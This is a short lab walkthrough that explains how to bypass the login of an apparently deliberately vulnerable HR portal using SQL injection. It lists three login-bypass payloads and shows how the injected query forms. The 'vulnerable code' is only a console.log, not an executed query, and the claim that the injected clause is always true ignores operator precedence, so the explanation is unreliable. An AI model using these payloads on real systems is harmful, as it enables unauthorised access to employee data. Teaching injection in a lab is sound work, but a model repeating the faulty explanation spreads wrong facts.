
# Attack 1: SQL Injection (SQLi)

SQL Injection allows attackers to execute arbitrary SQL commands on the database server.

## Step 1: Access the Login Page

1. Navigate to the HR Portal login page at `http://[EC2-IP-ADDRESS]/login`
2. You'll see a standard login form with email and password fields

## Step 2: Perform SQL Injection

1. In the email field, enter one of the following SQL injection payloads:
   - `' OR '1'='1`  
   - `admin@example.com' --`  
   - `john@example.com' OR 1=1--`
2. In the password field, enter anything (it will be ignored due to the injection)
3. Click the "Log In" button

## Step 3: Verify Access

1. If successful, you'll be logged in as the first user in the database (likely John Doe)
2. You now have access to the HR Portal with employee privileges

## Explanation

The vulnerable login code looks like this:
```javascript
// Vulnerable code
console.log(`SELECT * FROM users WHERE email='${email}' AND password='${password}'`);
```

When you input `' OR '1'='1`, the query becomes:
```sql
SELECT * FROM users WHERE email='' OR '1'='1' AND password='anything'
```

Since `'1'='1'` is always true, this returns all users and logs you in as the first user.
